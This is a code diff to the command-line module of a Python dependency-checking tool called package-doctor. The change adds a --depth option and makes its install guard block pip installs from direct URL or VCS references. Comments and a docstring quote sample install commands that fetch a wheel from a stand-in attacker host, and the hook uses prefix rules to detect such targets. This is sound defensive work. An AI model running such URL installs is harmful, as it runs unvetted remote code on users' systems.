@@ -9,7 +9,7 @@ import json
 import sys
 from pathlib import Path
 
-from packaging.requirements import InvalidRequirement
+from packaging.requirements import InvalidRequirement, Requirement
 from rich.console import Console
 from rich.markup import escape
 
@@ -24,13 +24,15 @@ from .guard import (
     UNCHECKED,
     WARN,
     Decision,
+    Provenance,
     added_requirements,
     decide,
     load_popular,
     parse_install_command,
     parse_requirement,
+    unresolvable_install_targets,
 )
-from .models import Finding, Package, Verdict
+from .models import Exposure, Finding, Package, Remediation, Verdict
 from .parsers import collect_dependencies
 from .parsers.discovery import (
     MAX_MANIFEST_BYTES,
@@ -46,7 +48,7 @@ from .report import (
     render_markdown,
     to_dict,
 )
-from .risk import Thresholds
+from .risk import Thresholds, assess
 from .sarif import to_sarif
 from .sources.client import Client
 from .sources.pypi import normalise
@@ -90,6 +92,22 @@ def _display(path: Path, root: Path) -> str:
         return str(path)
 
 
+def _depth(value: str) -> int:
+    """argparse type for --depth: a non-negative directory count.
+
+    A negative value would just make discover_nested's `range(depth)` loop
+    run zero times - the same as 0 - which is a confusing way to fail. Reject
+    it explicitly instead.
+    """
+    try:
+        n = int(value)
+    except ValueError:
+        raise argparse.ArgumentTypeError(f"{value!r} is not an integer") from None
+    if n < 0:
+        raise argparse.ArgumentTypeError(f"{value!r} must be 0 or greater")
+    return n
+
+
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog="package-doctor",
@@ -131,6 +149,16 @@ def build_parser() -> argparse.ArgumentParser:
 
     scan = sub.add_parser("scan", help="scan a project's dependencies")
     scan.add_argument("path", nargs="?", default=".", help="project directory (default: .)")
+    scan.add_argument(
+        "--depth",
+        type=_depth,
+        default=NESTED_DEPTH,
+        metavar="N",
+        help=(
+            "how many directories below the root to look for dependency "
+            f"files, when the root itself declares none (default: {NESTED_DEPTH})"
+        ),
+    )
     scan.add_argument("--json", dest="as_json", action="store_true", help="emit JSON")
     scan.add_argument(
         "--output", "-o", type=Path, help="write JSON to a file instead of stdout"
@@ -193,6 +221,16 @@ def build_parser() -> argparse.ArgumentParser:
     )
     explain.add_argument(
         "--path", default=".", help="project directory to check for imports (default: .)"
+    )
+    explain.add_argument(
+        "--depth",
+        type=_depth,
+        default=NESTED_DEPTH,
+        metavar="N",
+        help=(
+            "how many directories below --path to look for dependency "
+            f"files, when the root itself declares none (default: {NESTED_DEPTH})"
+        ),
     )
     explain.add_argument(
         "--src",
@@ -281,7 +319,7 @@ async def _run_scan(args: argparse.Namespace, console: Console) -> int:
         # Nothing declared at the root: look a little way down, skipping the
         # places where somebody else's dependency files live.
         root = target
-        paths, nested = discover_project(target)
+        paths, nested = discover_project(target, depth=args.depth)
         if nested:
             shown = ", ".join(_display(p, root) for p in nested[:4])
             more = f" and {len(nested) - 4} more" if len(nested) > 4 else ""
@@ -291,7 +329,7 @@ async def _run_scan(args: argparse.Namespace, console: Console) -> int:
                 else "Nothing at the root declares a dependency; also using"
             )
             notes.print(
-                f"[dim]{lead} {shown}{more}, found up to {NESTED_DEPTH} "
+                f"[dim]{lead} {shown}{more}, found up to {args.depth} "
                 f"directories down.[/dim]"
             )
     else:
@@ -303,7 +341,7 @@ async def _run_scan(args: argparse.Namespace, console: Console) -> int:
         console.print(
             "[dim]Looked for: uv.lock, poetry.lock, Pipfile.lock, pyproject.toml, "
             "Pipfile, setup.cfg, setup.py, requirements*.txt - at the root and up to "
-            f"{NESTED_DEPTH} directories down, outside tests, docs, examples and "
+            f"{args.depth} directories down, outside tests, docs, examples and "
             "vendored code.[/dim]"
         )
         return EXIT_USAGE
@@ -504,7 +542,7 @@ async def _run_explain(args: argparse.Namespace, console: Console) -> int:
     if not args.no_reachability and root.is_dir():
         version_from_lock = None
         try:
-            manifests, _ = discover_project(root)
+            manifests, _ = discover_project(root, depth=args.depth)
             deps = collect_dependencies(manifests, root=root)
             version_from_lock = deps.versions.get(normalise(args.name))
             known = set(deps.versions)
@@ -573,37 +611,88 @@ async def _run_explain(args: argparse.Namespace, console: Console) -> int:
 CheckRow = tuple[Package, Finding, Decision]
 
 
+def _direct_reference_url(text: str) -> str | None:
+    """The URL or VCS target of a PEP 508 direct reference requirement -
+    ``name @ https://...`` or ``name @ git+https://...`` - if this is one.
+
+    ``parse_requirement`` reports only the name for these, which on its own
+    would make ``package-doctor check "requests @ https://evil.example/x.whl"``
+    show a clean check of the real PyPI ``requests``: right name, wrong
+    artifact. What ``pip install`` actually fetches for a direct reference is
+    whatever sits at the URL, which has no necessary relationship to the PyPI
+    project of the same name and carries no registry or advisory history to
+    check it against.
+    """
+    try:
+        return Requirement(text).url
+    except InvalidRequirement:
+        return None
+
+
 async def run_check(
     requirements: list[str], *, args: argparse.Namespace
 ) -> tuple[list[CheckRow], dict[str, int]]:
     """Look up each requirement and decide. Shared by `check` and the hook."""
-    packages = []
-    for text in requirements:
-        name, pinned, specifier = parse_requirement(text)
-        packages.append(Package(name=name, version=pinned, specifier=specifier, direct=True))
-
     now = _now()
-    cache = Cache(ttl=args.cache_ttl, enabled=not args.no_cache)
-    try:
-        async with Client(cache, concurrency=args.concurrency) as client:
-            analyzer = Analyzer(
-                client, load_exposure_map(), _thresholds(args), skip_repo=args.offline_repo,
-                assume_latest=args.assume_latest,
-            )
-            findings = await analyzer.analyze_all(packages, now)
-            degraded = dict(client.degraded)
-    finally:
-        cache.close()
+    to_analyze: list[tuple[int, Package]] = []
+    direct_refs: dict[int, tuple[Package, str]] = {}
+    for i, text in enumerate(requirements):
+        name, pinned, specifier = parse_requirement(text)
+        package = Package(name=name, version=pinned, specifier=specifier, direct=True)
+        url = _direct_reference_url(text)
+        if url:
+            direct_refs[i] = (package, url)
+        else:
+            to_analyze.append((i, package))
+
+    degraded: dict[str, int] = {}
+    findings_by_index: dict[int, Finding] = {}
+    if to_analyze:
+        cache = Cache(ttl=args.cache_ttl, enabled=not args.no_cache)
+        try:
+            async with Client(cache, concurrency=args.concurrency) as client:
+                analyzer = Analyzer(
+                    client, load_exposure_map(), _thresholds(args), skip_repo=args.offline_repo,
+                    assume_latest=args.assume_latest,
+                )
+                findings = await analyzer.analyze_all([p for _, p in to_analyze], now)
+                degraded = dict(client.degraded)
+        finally:
+            cache.close()
+        for (i, _), finding in zip(to_analyze, findings, strict=True):
+            findings_by_index[i] = finding
 
     popular = load_popular()
-    rows = []
-    for package, finding in zip(packages, findings, strict=True):
+    computed: dict[int, CheckRow] = {}
+    for i, package in to_analyze:
         decision = decide(
-            finding, now=now, popular=popular, new_days=args.new_days,
+            findings_by_index[i], now=now, popular=popular, new_days=args.new_days,
             degraded=bool(degraded),
         )
-        rows.append((package, finding, decision))
-    return rows, degraded
+        computed[i] = (package, findings_by_index[i], decision)
+    for i, (package, url) in direct_refs.items():
+        # decide()'s generic "finding.error is set" path reports UNCHECKED
+        # and allows the install - correct for an upstream outage, backwards
+        # here: an uncheckable *URL* install, fetching code with no registry
+        # entry at all, is exactly the case this guardrail exists for. Built
+        # directly instead, rather than routed through decide().
+        finding = assess(
+            package, Exposure(), Remediation(gaps=[f"direct URL/VCS reference: {url}"]),
+            now=now, thresholds=_thresholds(args),
+        )
+        finding.error = f"direct URL/VCS reference, not a PyPI lookup: {url}"
+        computed[i] = (
+            package,
+            finding,
+            Decision(
+                BLOCK,
+                [f"installs directly from {url}, not from PyPI - no registry, "
+                 f"advisory or provenance check applies to this; review the "
+                 f"source before allowing it"],
+                Provenance(found=None),
+            ),
+        )
+    return [computed[i] for i in range(len(requirements))], degraded
 
 
 def check_payload(rows: list[CheckRow], degraded: dict[str, int], now: dt.datetime) -> dict:
@@ -722,21 +811,57 @@ async def _run_hook(args: argparse.Namespace, stdin: str) -> int:
     if not isinstance(command, str):
         return EXIT_OK
     requirements = parse_install_command(command)
-    if not requirements:
+    # Anything the shell parser recognised as an install target but could
+    # not turn into a checkable name - a URL or a VCS reference, the
+    # highest-risk form of install there is. Checked unconditionally, not
+    # only when `requirements` is empty: `pip install requests
+    # https://evil.example/pkg.whl` must not slip through just because
+    # `requests` also appears in the same command.
+    remote = [
+        target for target in unresolvable_install_targets(command)
+        if target.startswith(("http://", "https://", "git+", "ssh://"))
+    ]
+    if not requirements and not remote:
         return EXIT_OK
 
-    try:
-        rows, _degraded = await run_check(requirements, args=args)
-    except Exception as exc:  # fail open, and say so where the user can see it
-        print(json.dumps({
-            "systemMessage": f"package-doctor could not check this install ({exc}); "
-                             f"it was allowed unchecked.",
-        }))
-        return EXIT_OK
+    rows: list[CheckRow] = []
+    unchecked: str | None = None
+    if requirements:
+        try:
+            rows, _degraded = await run_check(requirements, args=args)
+        except Exception as exc:  # fail open, and say so where the user can see it
+            if not remote:
+                print(json.dumps({
+                    "systemMessage": f"package-doctor could not check this install ({exc}); "
+                                     f"it was allowed unchecked.",
+                }))
+                return EXIT_OK
+            # Failing open is for outages: the registry could not answer about
+            # a *name*, so the name is allowed rather than stopping work on
+            # somebody else's downtime. A URL or VCS target in the same command
+            # never needed a registry answer to be blocked, and a lookup error
+            # must not become the way past it - `pip install requests
+            # https://evil.example/pkg.whl` during a PyPI outage is still a
+            # URL install. The names are reported as unchecked; the block
+            # below stands on the URL alone.
+            unchecked = (
+                "UNCHECKED " + ", ".join(requirements)
+                + f": could not be checked ({exc}); allowed on its own, but this "
+                  "command is blocked for the target below"
+            )
 
     lines = _hook_lines(rows)
+    if unchecked:
+        lines.append(unchecked)
+    if remote:
+        lines.append(
+            "BLOCK " + ", ".join(remote) + ": installs directly from a URL or VCS "
+            "reference, not a PyPI package - no registry, advisory or provenance "
+            "check applies to this"
+        )
+
     blocking = {BLOCK, WARN} if args.warn_blocks else {BLOCK}
-    if any(d.level in blocking for _, _, d in rows):
+    if remote or any(d.level in blocking for _, _, d in rows):
         sys.stderr.write(
             "package-doctor blocked this install:\n  " + "\n  ".join(lines)
             + "\nPick a maintained alternative, pin a fixed version, or ask the user "
